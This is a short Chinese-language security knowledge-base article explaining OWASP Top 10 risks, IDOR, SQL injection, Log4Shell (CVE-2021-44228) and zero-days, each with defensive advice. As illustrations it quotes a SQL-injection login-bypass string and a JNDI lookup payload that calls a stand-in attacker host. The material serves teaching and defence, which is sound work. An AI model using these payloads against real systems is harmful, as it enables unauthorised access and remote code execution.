# 网络安全知识库 - 核心漏洞与防御

## OWASP Top 10 概述
OWASP Top 10 是由开放 Web 应用程序安全项目（OWASP）发布的，关于 Web 应用程序最关键安全风险的权威排行榜。它每几年更新一次，是安全从业者的必修课。
2021 版本中最主要的三大风险是：A01 失效的访问控制、A02 加密机制失效、A03 注入攻击。

## A01：失效的访问控制 (Broken Access Control)
这是 2021 年的第一名。它指的是用户能够以非预期的权限执行操作。
例如，攻击者可以通过修改 URL 中的 ID（如 `user_id=123` 改为 `user_id=124`），查看或修改其他用户的私密数据。这就是著名的 IDOR（不安全的直接对象引用）漏洞。
防御建议：实施最小权限原则，使用基于角色的访问控制（RBAC），并在服务端进行严格的权限校验，绝对不要信任前端的任何权限声明。

## A03：注入攻击 (Injection)
注入攻击（包括 SQL 注入、命令注入、LDAP 注入等）非常危险。
以 SQL 注入（SQLi）为例：攻击者通过在输入框中插入恶意的 SQL 代码，欺骗后端数据库执行非预期的查询。
例如，在登录框输入 `' OR '1'='1` 就可以绕过密码验证，直接进入系统。
防御 SQL 注入的最佳实践是使用“参数化查询（Parameterized Queries）”，也叫“预编译语句”。绝对不要使用字符串拼接来构建 SQL 语句。
除此之外，还应限制数据库账户的权限，遵循最小权限原则。

## CVE-2021-44228：Log4j2 漏洞（Log4Shell）
这是一个极其著名的 Java 远程代码执行（RCE）漏洞，影响极其广泛。
该漏洞存在于 Apache Log4j2 这个 Java 日志记录库中。当程序将用户输入的数据记录到日志时，攻击者可以构造恶意的 JNDI 注入（如 `${jndi:ldap://attacker.com/a}`），触发远程加载恶意代码。
防御措施：
1. 升级 Log4j2 到 2.17.0 或更高版本。
2. 在启动参数中设置 `-Dlog4j2.formatMsgNoLookups=true`。
3. 部署 WAF（Web 应用防火墙）进行流量过滤。

## 零日漏洞 (Zero-Day)
零日漏洞是指已经被发现，但官方还没有发布补丁（尚未修复）的漏洞。攻击者可以利用零日漏洞发起“零日攻击”。
由于没有官方修复，防御零日漏洞主要依赖：
1. 虚拟补丁（WAF 规则拦截）。
2. 威胁情报的快速响应。
3. 严格的网络隔离和访问控制。

## 安全编码原则
1. 输入验证：永远不要信任用户的输入，所有输入必须进行严格的验证和转义。
2. 输出编码：根据输出位置（HTML、JS、SQL），对输出内容进行适当的编码，防止 XSS 和注入。
3. 纵深防御：不要只依赖单一的安全措施，应该在网络、主机、应用、数据等多个层面建立防线。
